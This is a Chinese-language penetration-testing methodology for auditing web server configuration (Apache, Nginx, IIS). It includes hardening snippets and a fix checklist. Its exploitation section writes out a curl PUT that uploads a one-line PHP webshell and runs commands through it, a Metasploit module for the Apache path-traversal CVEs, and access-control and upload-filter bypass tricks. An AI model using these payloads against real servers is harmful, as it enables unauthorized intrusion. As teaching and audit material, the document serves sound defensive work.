# Web 服务器配置审计方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对 Web 服务器（Apache、Nginx、IIS 等）配置安全审计的系统性方法论。通过识别和利用 Web 服务器配置错误，评估目标系统的安全态势，并提供修复建议。

### 1.2 适用范围
- Apache HTTP Server
- Nginx
- Microsoft IIS
- Lighttpd
- Caddy
- 其他 Web 服务器软件

### 1.3 读者对象
- 渗透测试工程师
- 安全审计人员
- 系统运维人员
- Web 服务器管理员

---

## 第二部分：核心渗透技术专题

### 专题：Web 服务器配置审计

#### 2.1 技术介绍

Web 服务器配置错误是导致安全漏洞的常见原因。不安全的配置可能导致信息泄露、未授权访问、代码执行等严重后果。

**常见配置错误类型：**

| 错误类型 | 描述 | 危害等级 |
|---------|------|---------|
| **目录列表开启** | 允许浏览目录内容 | 中 |
| **HTTP 方法未限制** | 支持危险方法（PUT、DELETE） | 高 |
| **敏感文件可访问** | 配置文件、备份文件可下载 | 高 |
| **服务器信息泄露** | 版本号、技术栈暴露 | 中 |
| **SSL/TLS 配置错误** | 使用弱加密协议 | 高 |
| **访问控制缺失** | 敏感目录未保护 | 高 |

#### 2.2 审计常见于哪些场景

| 场景 | 风险点描述 |
|-----|-----------|
| **新系统上线** | 使用默认配置未加固 |
| **运维交接** | 配置变更未记录 |
| **紧急修复后** | 临时配置未恢复 |
| **第三方托管** | 配置标准不一致 |
| **容器化部署** | 基础镜像配置不安全 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. 服务器指纹识别**

```bash
# 获取服务器版本信息
curl -I http://target/

# 使用 whatweb 识别
whatweb http://target/

# 使用 nikto 扫描
nikto -h http://target/
```

**2. 目录列表检测**

```bash
# 访问常见目录
curl http://target/images/
curl http://target/uploads/
curl http://target/backup/

# 使用 dirb 扫描
dirb http://target/
```

**3. HTTP 方法测试**

```bash
# OPTIONS 方法探测
curl -X OPTIONS http://target/

# PUT 方法测试
curl -X PUT http://target/test.txt -d "test"

# DELETE 方法测试
curl -X DELETE http://target/test.txt

# TRACE 方法测试（检测 HTTP TRACE 攻击）
curl -X TRACE http://target/
```

**4. 敏感文件检测**

| 文件类型 | 常见路径 |
|---------|---------|
| **配置文件** | `.htaccess`、`web.config`、`nginx.conf` |
| **备份文件** | `.bak`、`.backup`、`.old`、`~` |
| **Git 文件** | `.git/`、`.git/config` |
| **环境文件** | `.env`、`.environment` |
| **日志文件** | `access.log`、`error.log` |

##### 2.3.2 白盒测试

**1. Apache 配置检查**

```apache
# ❌ 不安全：目录列表开启
<Directory /var/www/html>
    Options Indexes FollowSymLinks
</Directory>

# ✅ 安全：关闭目录列表
<Directory /var/www/html>
    Options -Indexes +FollowSymLinks
</Directory>

# ❌ 不安全：服务器签名开启
ServerSignature On
ServerTokens Full

# ✅ 安全：隐藏版本信息
ServerSignature Off
ServerTokens Prod
```

**2. Nginx 配置检查**

```nginx
# ❌ 不安全：自动索引开启
location / {
    autoindex on;
}

# ✅ 安全：关闭自动索引
location / {
    autoindex off;
}

# ❌ 不安全：服务器版本暴露
# 默认配置

# ✅ 安全：隐藏版本
server_tokens off;
```

**3. IIS 配置检查**

```xml
<!-- ❌ 不安全：目录浏览开启 -->
<directoryBrowse enabled="true" />

<!-- ✅ 安全：关闭目录浏览 -->
<directoryBrowse enabled="false" />

<!-- 检查请求过滤配置 -->
<requestFiltering>
    <hiddenSegments>
        <add segment=".git" />
        <add segment=".env" />
    </hiddenSegments>
</requestFiltering>
```

#### 2.4 漏洞利用方法

##### 2.4.1 目录列表利用

```
1. 发现目录列表开启
   http://target/uploads/
   
2. 浏览所有上传文件
   查找敏感文件：配置文件、备份、源码
   
3. 下载敏感文件
   http://target/uploads/config.php.bak
```

##### 2.4.2 HTTP PUT 方法利用

```bash
# 1. 检测 PUT 方法是否允许
curl -X OPTIONS http:///target/
# 响应包含：PUT

# 2. 上传 Webshell
curl -X PUT http://target/shell.php \
     -d '<?php system($_GET["cmd"]); ?>'

# 3. 访问并执行命令
http://target/shell.php?cmd=id
```

##### 2.4.3 .git 目录泄露利用

```bash
# 1. 检测 .git 目录
curl http://target/.git/config

# 2. 使用 git-dumper 下载
git-dumper.py http://target/.git ./dump

# 3. 恢复源码
cd dump
git checkout

# 4. 审计源码查找敏感信息
```

##### 2.4.4 服务器版本信息利用

```
1. 获取服务器版本
   Server: Apache/2.4.49 (Unix)

2. 查找已知漏洞
   CVE-2021-41773 (路径遍历)
   CVE-2021-42013 (RCE)

3. 使用 Metasploit 利用
   use exploit/multi/http/apache_normalize_path_rce
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 访问控制绕过

| 绕过技术 | 描述 | 示例 |
|---------|------|------|
| **URL 编码** | 编码特殊字符 | `%2e%2e%2f` |
| **双重编码** | 多次 URL 编码 | `%252e%252e%252f` |
| **Unicode 标准化** | 利用 Unicode 差异 | `\u002e\u002e\u002f` |
| **路径变异** | 使用不同路径表示 | `..;/`、`..%c0%af` |

##### 2.5.2 文件扩展名绕过

```
# 绕过 .htaccess 限制
shell.php → shell.php5, shell.phtml, shell.phar

# 绕过上传过滤
shell.asp → shell.asp;.jpg (IIS 6.0)
shell.aspx → shell(1).aspx
```

##### 2.5.3 请求头绕过

```bash
# 使用 X-Forwarded-For 绕过 IP 限制
curl -H "X-Forwarded-For: 127.0.0.1" http://target/admin

# 使用 Referer 绕过
curl -H "Referer: http://target/" http://target/admin
```

---

## 第三部分：附录

### 3.1 Web 服务器安全配置速查

| 配置项 | Apache | Nginx | IIS |
|-------|--------|-------|-----|
| **关闭目录列表** | `Options -Indexes` | `autoindex off` | `directoryBrowse enabled="false"` |
| **隐藏版本** | `ServerTokens Prod` | `server_tokens off` | `removeServerHeader` |
| **限制方法** | `<LimitExcept>` | `limit_except` | `requestFiltering` |
| **隐藏敏感文件** | `FilesMatch` | `location ~ /\.` | `hiddenSegments` |

### 3.2 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Nikto** | Web 服务器扫描 | `nikto -h target` |
| **Nmap** | 服务识别 | `nmap -sV -p 80,443 target` |
| **WhatWeb** | 指纹识别 | `whatweb target` |
| **Gobuster** | 目录扫描 | `gobuster dir -u target` |
| **SSLyze** | SSL 配置检测 | `sslyze target` |

### 3.3 修复建议

- [ ] 关闭目录列表功能
- [ ] 隐藏服务器版本信息
- [ ] 限制 HTTP 方法
- [ ] 配置适当的文件权限
- [ ] 启用 HTTPS 并配置强加密
- [ ] 配置安全响应头
- [ ] 定期更新服务器软件
- [ ] 实施访问控制列表
